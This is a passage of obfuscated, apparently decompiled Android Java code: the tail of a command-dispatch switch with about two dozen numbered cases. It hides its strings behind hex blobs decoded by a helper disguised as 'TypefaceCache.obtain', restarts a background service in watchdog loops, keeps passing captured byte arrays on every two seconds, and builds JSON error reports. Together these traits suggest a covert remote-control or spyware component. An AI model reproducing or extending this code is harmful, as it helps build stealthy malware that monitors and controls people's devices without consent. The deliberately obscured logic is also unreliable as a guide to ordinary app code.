                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                            e.getMessage();
                                            byteBufferAllocate = byteBuffer;
                                            z = false;
                                            i5 = 16;
                                        } else {
                                            int i17 = (-56) + 72;
                                            Thread.sleep(8L);
                                            j6 += (long) 8;
                                            if (j6 > 3000) {
                                                long jCurrentTimeMillis5 = System.currentTimeMillis();
                                                if (ManagerUMController.ECwLkmPW1UKz7J6E && i6 < i2 && jCurrentTimeMillis5 - j7 > 3000) {
                                                    TypefaceCache.obtain("000D0079001B008100E200BE00DF00A200300036005D008800E200FF");
                                                    TypefaceCache.obtain("002E0065001700C700E300BA00DC00A3002A0078005C00C700C2009A00E1009300020044006F00C700F900B100C600A2002D0062001B00CF00F100AB00C600A2002E0066004F00C7");
                                                    i6++;
                                                    try {
                                                        try {
                                                            Context context2 = rWY6BVSB0XxPbw3.dDIMxZXP1V8HdM;
                                                            context2.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context2));
                                                        } catch (Exception e9) {
                                                            try {
                                                                TypefaceCache.obtain("00110053006800B300D1008D00E600E7002A0078004F008200FE00AB009200A10022007F0057008200F400E50092");
                                                                e9.getMessage();
                                                            } catch (Exception e10) {
                                                                e = e10;
                                                                j6 = 0;
                                                                j7 = jCurrentTimeMillis5;
                                                                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                                                e.getMessage();
                                                            }
                                                        }
                                                        j6 = 0;
                                                        j7 = jCurrentTimeMillis5;
                                                    } catch (OutOfMemoryError unused10) {
                                                        j6 = 0;
                                                        j7 = jCurrentTimeMillis5;
                                                        TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                                        System.gc();
                                                        rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                                        Thread.sleep(500L);
                                                    }
                                                    break;
                                                } else if ((!ManagerUMController.ECwLkmPW1UKz7J6E || i6 >= i2) && jCurrentTimeMillis5 - j8 > 8000) {
                                                    TypefaceCache.obtain("000500630057008B00B0009200D700A3002A0077006B009500FF00B500D700A40037007F0054008900B000AD00D700B4003700770049009300B000F700DB00B400000077004B009300E500AD00DB00A90024002B");
                                                    TypefaceCache.obtain("006F0036004A009200F900BC00D9008600370062005E008A00E000AB00C100FA");
                                                    try {
                                                        rWY6BVSB0XxPbw3.J0zjQ7CAgohuxU20eCW6.execute(new uY2iPU7ne5s7Y5LeXnLI(rWY6BVSB0XxPbw3, 11));
                                                        i6 = 0;
                                                        j6 = 0;
                                                        j8 = jCurrentTimeMillis5;
                                                    } catch (Exception e11) {
                                                        e = e11;
                                                        i6 = 0;
                                                        j6 = 0;
                                                        j8 = jCurrentTimeMillis5;
                                                        TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200E200AD00DD00B500790036");
                                                        e.getMessage();
                                                    } catch (OutOfMemoryError unused11) {
                                                        i6 = 0;
                                                        j6 = 0;
                                                        j8 = jCurrentTimeMillis5;
                                                        TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002F00790054009700B0009000FD008A00632002001B008100FF00AD00D100AE002D0071001B00A000D3");
                                                        System.gc();
                                                        rWY6BVSB0XxPbw3.H9XlUr4OeMJFiXK.set(0);
                                                        Thread.sleep(500L);
                                                    }
                                                }
                                                byteBufferAllocate = byteBuffer;
                                                z = false;
                                                i5 = 16;
                                            }
                                        }
                                        rWY6BVSB0XxPbw3.Ee8d2j4S9Vm5yGuR();
                                        if (i7 % 60 == 0 && i7 > 0) {
                                            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7003000730055009300B0");
                                            TypefaceCache.obtain("006300700049008600FD00BA00C100E7006B00670006");
                                            TypefaceCache.obtain("006F00360058008800F400BA00D100FA");
                                            TypefaceCache.obtain("006F00360049009300E400E2");
                                            TypefaceCache.obtain("002E0065001700C700FD00B600D400FA");
                                        }
                                        byteBufferAllocate = byteBuffer;
                                        z = false;
                                        i5 = 16;
                                    }
                                }
                                break;
                            } catch (InterruptedException unused12) {
                            }
                        } catch (OutOfMemoryError unused13) {
                            byteBuffer = byteBufferAllocate;
                        }
                    } catch (Exception e12) {
                        e = e12;
                        byteBuffer = byteBufferAllocate;
                    }
                }
                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700250064005A008A00F500FF00DE00A8002C0066001B008200FE00BB00D700A3006F00360048008200FE00AB0092");
                TypefaceCache.obtain("006300700049008600FD00BA00C1");
                break;
            case 3:
                this.vekpFI4d1Nc4fakF.Qrz92kRPw4GcghAc();
                break;
            case 4:
                this.vekpFI4d1Nc4fakF.Qrz92kRPw4GcghAc();
                break;
            case 5:
                this.vekpFI4d1Nc4fakF.Qrz92kRPw4GcghAc();
                break;
            case 6:
                try {
                    Context context3 = this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM;
                    String str5 = ManagerUMController.DVTNwpDEVsUKuznof;
                    context3.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context3));
                } catch (Exception e13) {
                    TypefaceCache.obtain("00080073005E009700F100B300DB00B100260036006900A200C3008B00F3009500170036005D008600F900B300D700A300790036");
                    e13.getMessage();
                    return;
                }
                break;
            case 7:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw4 = this.vekpFI4d1Nc4fakF;
                rWY6BVSB0XxPbw4.ibVTtJUNfrGYbW(rWY6BVSB0XxPbw4.b1EoSIRjJHO5);
                break;
            case 8:
                this.vekpFI4d1Nc4fakF.DVTNwpDEVsUKuznof();
                break;
            case 9:
                this.vekpFI4d1Nc4fakF.l1V0lQr6TbwNKqHfXNbb();
                break;
            case 10:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw5 = this.vekpFI4d1Nc4fakF;
                while (rWY6BVSB0XxPbw5.OYRwk007Mtyi) {
                    try {
                        Thread.sleep(2000L);
                        String str6 = vatBtnIbOWqS8Z.K7eEOBPYP9VIoHWTe;
                        vatBtnIbOWqS8Z vatbtnibowqs8z = vatBtnIbOWqS8Z.dTS0S7eC32ubQH54j36;
                        byte[] bArr5 = vatbtnibowqs8z != null ? (byte[]) vatbtnibowqs8z.b1EoSIRjJHO5.get() : null;
                        boolean z3 = vatbtnibowqs8z != null ? vatbtnibowqs8z.ibVTtJUNfrGYbW.get() : false;
                        TypefaceCache.obtain("000B0040007500A400B000B400D700A2003300770057008E00E600BA009200E4");
                        TypefaceCache.obtain("007900360056008000E200E2");
                        TypefaceCache.obtain("00630064004E008900FE00B600DC00A0007E");
                        TypefaceCache.obtain("006300700049008600FD00BA008F");
                        TypefaceCache.obtain("00630071005E008900AD");
                        TypefaceCache.obtain("00630065005E008900E400E2");
                        TypefaceCache.obtain("00630061004800DA");
                        TypefaceCache.obtain("006300750054008900FE00E2");
                        if (z3 && bArr5 != null) {
                            rWY6BVSB0XxPbw5.J0zjQ7CAgohuxU20eCW6(bArr5, vatbtnibowqs8z.gmNWMfvn6zlEj, vatbtnibowqs8z.gIIiyi2ddlMDR0);
                        }
                    } catch (InterruptedException unused14) {
                    } catch (Exception e14) {
                        TypefaceCache.obtain("000B0040007500A400B000B400D700A2003300770057008E00E600BA009200A2003100640054009500AA00FF");
                        e14.getMessage();
                    }
                }
                TypefaceCache.obtain("000B0040007500A400B000B400D700A2003300770057008E00E600BA009200AB002C0079004B00C700F500B100D600A20027");
                break;
            case 11:
                this.vekpFI4d1Nc4fakF.qfTrc75xwRVMl85vh(ManagerUMController.XuO9PPFo607ssKwZjNW);
                break;
            case 12:
                dDIMxZXP1V8HdM();
                break;
            case 13:
                w9sT1Swbhx3hs();
                break;
            case 14:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw6 = this.vekpFI4d1Nc4fakF;
                GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
                Context context4 = rWY6BVSB0XxPbw6.dDIMxZXP1V8HdM;
                gARjgaGEpTotOxcl8vfe.getClass();
                GARjgaGEpTotOxcl8vfe.ECwLkmPW1UKz7J6E(context4);
                break;
            case 15:
                vekpFI4d1Nc4fakF();
                break;
            case 16:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw7 = this.vekpFI4d1Nc4fakF;
                try {
                    rWY6BVSB0XxPbw7.wotphlvK9sPbXJ();
                } catch (Exception e15) {
                    TypefaceCache.obtain("00200077004B009300E500AD00D70091002A00770068009E00E300AB00D700AA001000750049008200F500B100C100AF002C0062001B008200E200AD00DD00B500790036");
                    e15.getMessage();
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003000750049008200F500B100C100AF002C0062", jSONObject2, TypefaceCache.obtain("0037006F004B0082"), "002600640049008800E2"), TypefaceCache.checked("045D045E040304D604AA04EF0092048004010423040604DF04DF00FF04F304FD0403042E040604AF04AE049D048200FD0063") + e15.getMessage());
                    rWY6BVSB0XxPbw7.H9XlUr4OeMJFiXK(jSONObject2);
                    return;
                }
                break;
            case 17:
                JXn4Qf7zpnLjP5();
                break;
            case 18:
                RWY6BVSB0XxPbw.A1BaTVAMeIXMnh(this.vekpFI4d1Nc4fakF, i2);
                break;
            case 19:
                Ee8d2j4S9Vm5yGuR();
                break;
            case 20:
                xDyLpEZyrcKVe0();
                break;
            case 21:
                ibVTtJUNfrGYbW();
                break;
            case 22:
                b1EoSIRjJHO5();
                break;
            case 23:
                pyu8ovAipBTLYAiKab();
                break;
            case 24:
                D5P1xCAyuvgF();
                break;
            default:
                RWY6BVSB0XxPbw rWY6BVSB0XxPbw8 = this.vekpFI4d1Nc4fakF;
                if (!rWY6BVSB0XxPbw8.xDyLpEZyrcKVe0 && rWY6BVSB0XxPbw8.ibVTtJUNfrGYbW) {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    TypefaceCache.obtain("000D0073004F009000FF00AD00D900E7003100730048009300FF00AD00D700A3006F00360049008200F300B000DC00A900260075004F008E00FE00B8009200AE002E007B005E008300F900BE00C600A2002F006F");
                    rWY6BVSB0XxPbw8.ibVTtJUNfrGYbW(rWY6BVSB0XxPbw8.b1EoSIRjJHO5);
                    break;
                }
                break;
        }
    }
}
